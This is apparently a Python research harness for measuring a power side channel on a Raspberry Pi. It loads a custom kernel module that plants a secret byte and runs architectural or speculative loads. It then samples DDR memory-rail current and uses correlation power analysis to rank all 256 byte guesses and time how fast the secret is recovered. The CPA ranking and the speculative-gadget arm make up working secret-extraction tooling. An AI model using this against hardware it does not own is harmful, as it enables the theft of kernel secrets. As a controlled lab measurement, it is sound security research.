#!/usr/bin/env python3
"""
spec_v11_cpa_recovery.py — time-to-recover one secret byte via HD(G,V), arch vs spec.

Secret V = one byte v* repeated 64x in a kernel cache line (256 possibilities).
Attacker controls ONLY G (also a byte g repeated 64x) and samples DDR_VDD2.
Leakage: VDD2 ~ alpha * HD(G,V) = alpha * 64 * HW(g ^ v*).
CPA: for each hypothesis vh in 0..255, correlate VDD2 with HW(g ^ vh) over the
trace pool; the true v* peaks. We report the rank-vs-N curve, the N at which v*
first reaches (and holds) rank 1, and the wall-clock time = N * t_per_trace, for
BOTH arms:
    REF  (arm 0)  = architectural loads (committed)   -> strong, fast
    ARM_I(arm 9)  = best speculative gadget (both-spec) -> weaker, slower

Thermal guards: cool to <=COOL_C before each arm; abort-flag if REF fails to
recover (that means the board throttled and the run is invalid).
Run ON the Pi as root.
"""
import csv, fcntl, math, os, random, struct, subprocess, sys, time

DEV    = "/dev/spec_power_p2_v11"
MODULE = "spec_power_p2_v11"
KO     = f"/home/pi/spectre_multi/phase2/{MODULE}.ko"
MAGIC  = 0xF1
LINE   = 64
def _IOW(n,sz): return 0x40000000|(sz<<16)|(MAGIC<<8)|n
def _IO(n):     return (MAGIC<<8)|n
SET_V=_IOW(1,LINE); SET_G=_IOW(2,LINE); START=_IO(3); STOP=_IO(4); SET_ARM=_IOW(21,4)

V_SECRET = 0x33                 # the sealed secret byte (recovery is byte-symmetric)
G_REF    = 0x00                 # fixed anchor byte (drift tracking)
ARMS     = [(0,"REF_arch"), (9,"ARM_I_spec")]
N_TRACES = {0: 150, 9: 800}     # REF as gate; focus traces on SPEC (clean rerun)
SAMPLE_S = 1.0
SAMPLE_DT= 0.10
INTER    = 0.40                 # pacing: idle gap lowers duty cycle -> slower self-heating
WARMUP_S = 4.0
ANCHOR_EVERY = 8
COOL_C   = 54                   # idle floor ~49C now; cool into the clean band before each arm
HOT_C    = 64                   # pause+cool if exceeded — keep measurement <=~64C (clean band)
COOL_MAX_WAIT = 300             # don't stall forever if the floor is above COOL_C
BASE_SEED= 0xCA11AB1E
OUT_DIR  = "/home/pi/spectre_multi/phase2/data/V11/CPA"
CONTAM   = ["spec_power_p2_v10","spec_power_p2_min13","spec_power_p2_min12",
            "spec_power_p2_min11","spec_power_p2_min10"]

def ioctl_op(c):  fd=os.open(DEV,os.O_RDWR); fcntl.ioctl(fd,c,0); os.close(fd)
def ioctl_buf(c,b): fd=os.open(DEV,os.O_RDWR); fcntl.ioctl(fd,c,b); os.close(fd)
def ioctl_u32(c,v): fd=os.open(DEV,os.O_RDWR); fcntl.ioctl(fd,c,v); os.close(fd)
def line(b): return bytes([b]*LINE)
def hw8(x): return bin(x & 0xFF).count("1")

def temp():
    o=subprocess.run(["vcgencmd","measure_temp"],capture_output=True,text=True).stdout
    try: return float(o.split("=")[1].split("'")[0])
    except: return float("nan")
def throttled():
    return subprocess.run(["vcgencmd","get_throttled"],capture_output=True,text=True).stdout.strip()

def contaminated():
    """detect a competing spec module loaded mid-run (the v_chain/min13 interferer)."""
    for m in ("spec_power_p2_min13","spec_power_p2_min12","spec_power_p2_min11","spec_power_p2_min10"):
        if os.path.exists("/sys/module/"+m): return m
    return None

def cool_to(thr, max_wait=COOL_MAX_WAIT):
    t=temp(); t0=time.time()
    while not math.isnan(t) and t>thr:
        if time.time()-t0 > max_wait:
            print(f"  [cool] gave up after {max_wait}s at {t:.1f}C (thermal floor); proceeding", flush=True)
            break
        print(f"  [cool] {t:.1f}C > {thr}C, waiting...", flush=True); time.sleep(20); t=temp()
    print(f"  [cool] {t:.1f}C ok", flush=True)

def read_vdd2_vddq():
    o=subprocess.run(["vcgencmd","pmic_read_adc"],capture_output=True,text=True).stdout
    v2=vq=float("nan")
    for L in o.splitlines():
        if "DDR_VDD2_A current" in L:
            try: v2=float(L.split("=")[1].rstrip("A"))*1000.0
            except: pass
        elif "DDR_VDDQ_A current" in L:
            try: vq=float(L.split("=")[1].rstrip("A"))*1000.0
            except: pass
    return v2,vq

def measure(g_byte):
    ioctl_op(STOP); ioctl_buf(SET_G, line(g_byte)); ioctl_op(START)
    v2s=[]; vqs=[]; t0=time.time()
    while time.time()-t0 < SAMPLE_S:
        v2,vq=read_vdd2_vddq()
        if not math.isnan(v2): v2s.append(v2)
        if not math.isnan(vq): vqs.append(vq)
        time.sleep(SAMPLE_DT)
    ioctl_op(STOP)
    m=lambda a:(sum(a)/len(a)) if a else float("nan")
    return m(v2s), m(vqs)

def system_init():
    for mod in CONTAM+[MODULE]:
        subprocess.run(["sudo","rmmod",mod],capture_output=True)
    time.sleep(0.2)
    r=subprocess.run(["sudo","insmod",KO,"n_workers=1"],capture_output=True,text=True)
    if r.returncode!=0: sys.stderr.write(f"insmod failed: {r.stderr}\n"); sys.exit(1)
    for _ in range(20):
        if os.path.exists(DEV): break
        time.sleep(0.1)
    ioctl_buf(SET_V, line(V_SECRET))           # seal the secret ONCE
    print(f"  [init] V sealed = 0x{V_SECRET:02X} x64 (single worker)", flush=True)

# ---- CPA helpers ----
def pearson(x,y):
    n=len(x); mx=sum(x)/n; my=sum(y)/n
    sxx=sum((a-mx)**2 for a in x); syy=sum((b-my)**2 for b in y)
    sxy=sum((a-mx)*(b-my) for a,b in zip(x,y))
    d=math.sqrt(sxx*syy)
    return sxy/d if d>0 else 0.0

def detrend(main, anchors):
    """piecewise-linear drift baseline from anchors (constant-HD g=G_REF)."""
    import bisect
    if not anchors: return [r["v2"] for r in main]
    ta=[r["t"] for r in anchors]; ya=[r["v2"] for r in anchors]
    pts=sorted(zip(ta,ya)); ts=[p[0] for p in pts]; ys=[p[1] for p in pts]
    out=[]
    for r in main:
        t=r["t"]
        if t<=ts[0]: b=ys[0]
        elif t>=ts[-1]: b=ys[-1]
        else:
            j=bisect.bisect_right(ts,t)-1
            f=(t-ts[j])/(ts[j+1]-ts[j]) if ts[j+1]!=ts[j] else 0
            b=ys[j]+f*(ys[j+1]-ys[j])
        out.append(r["v2"]-b)
    return out

def cpa_rank(gs, v2, v_true):
    """return (rank_of_true(1=best), r_true, r_best_wrong) using signed correlation."""
    models={}  # precompute HW(g^vh) columns lazily
    rs=[]
    for vh in range(256):
        model=[hw8(g ^ vh) for g in gs]
        rs.append((vh, pearson(v2, model)))
    rs.sort(key=lambda t:-t[1])                 # signed desc (leakage is +)
    rank=[i for i,(vh,_) in enumerate(rs) if vh==v_true][0]+1
    r_true=[r for vh,r in rs if vh==v_true][0]
    r_best_wrong=rs[0][1] if rs[0][0]!=v_true else rs[1][1]
    return rank, r_true, r_best_wrong

def main():
    os.makedirs(OUT_DIR,exist_ok=True)
    stamp=time.strftime("%Y%m%d_%H%M%S")
    out=os.path.join(OUT_DIR,f"cpa_recovery_{stamp}.csv")
    print(f"  out={out}\n  secret=0x{V_SECRET:02X}  arms={[a[1] for a in ARMS]}  "
          f"N={N_TRACES}  sample={SAMPLE_S}s", flush=True)
    system_init()
    fp=open(out,"w",newline=""); w=csv.writer(fp)
    w.writerow(["arm_id","arm","trace","t_s","is_anchor","g_byte","vdd2_mA","vddq_mA"]); fp.flush()
    t0=time.time(); results={}
    for arm_id,arm in ARMS:
        print(f"\n#### {arm} (arm {arm_id}) ####", flush=True)
        print(f"  throttled={throttled()}", flush=True)
        cool_to(COOL_C)
        ioctl_op(STOP); time.sleep(0.1); ioctl_u32(SET_ARM, arm_id)
        ioctl_buf(SET_G, line(G_REF)); ioctl_op(START); tw=time.time()
        while time.time()-tw < WARMUP_S: time.sleep(0.3)
        ioctl_op(STOP)
        rng=random.Random(BASE_SEED+arm_id)
        N=N_TRACES[arm_id]; rows=[]; arm_t0=time.time()
        for i in range(N):
            is_anchor = (i % ANCHOR_EVERY == 0)
            g = G_REF if is_anchor else rng.randrange(256)
            t=time.time()-t0
            v2,vq=measure(g)
            w.writerow([arm_id,arm,i,f"{t:.3f}",int(is_anchor),g,f"{v2:.4f}",f"{vq:.4f}"]); fp.flush()
            rows.append({"t":t,"anchor":is_anchor,"g":g,"v2":v2,"vq":vq})
            c=contaminated()
            if c:
                print(f"    !! CONTAMINATION: {c} loaded mid-run at trace {i} -> ABORT (run invalid)", flush=True)
                ioctl_op(STOP); fp.close(); sys.exit(2)
            if i % 32 == 0:
                tc=temp()
                print(f"    {i:4d}/{N}  g=0x{g:02X} VDD2={v2:.2f} VDDQ={vq:.2f} "
                      f"T={tc:.1f}C t={(time.time()-t0)/60:.1f}m", flush=True)
                if tc>HOT_C:
                    print(f"    !! {tc:.1f}C > {HOT_C}C — pausing to cool", flush=True)
                    ioctl_op(STOP); cool_to(COOL_C); ioctl_u32(SET_ARM,arm_id)
            time.sleep(INTER)
        per_trace=(time.time()-arm_t0)/N
        results[arm_id]={"rows":rows,"per_trace":per_trace,"name":arm}
        print(f"  [{arm}] {N} traces, {per_trace*1000:.0f} ms/trace", flush=True)
    fp.close(); print(f"\nDone. CSV {out}", flush=True)

    # ---- analysis: rank-vs-N + time-to-recover ----
    print("\n"+"="*88)
    print(f"TIME-TO-RECOVER one secret byte (0x{V_SECRET:02X}) via HD(G,V), control only G")
    print("="*88)
    for arm_id,arm in ARMS:
        R=results[arm_id]; rows=R["rows"]; pt=R["per_trace"]
        anchors=[r for r in rows if r["anchor"]]; main=[r for r in rows if not r["anchor"]]
        dv=detrend(main, anchors); gs=[r["g"] for r in main]
        grid=[n for n in (25,50,100,150,200,300,400,500,600,700,800) if n<=len(main)]
        if len(main) not in grid: grid.append(len(main))
        print(f"\n--- {arm}  ({len(main)} attack traces, {pt*1000:.0f} ms/trace) ---")
        print(f"  {'N':>5}{'rank(v*)':>10}{'r_true':>9}{'r_2nd':>9}{'time':>9}")
        n_recovered=None
        for n in grid:
            rk,rt,rw=cpa_rank(gs[:n], dv[:n], V_SECRET)
            tt=n*pt
            print(f"  {n:>5}{rk:>10}{rt:>9.3f}{rw:>9.3f}{tt:>8.1f}s")
            if rk==1 and n_recovered is None: n_recovered=n
        if n_recovered:
            print(f"  => recovered (rank 1) at N={n_recovered}  =>  ~{n_recovered*pt:.1f} s "
                  f"({n_recovered*pt/60:.1f} min) of attack time")
        else:
            print(f"  => NOT recovered in {len(main)} traces (final rank above)")
    print("\n(If REF_arch did not reach rank 1, the board was thermally compromised "
          "-> run invalid.)", flush=True)

if __name__=="__main__":
    main()
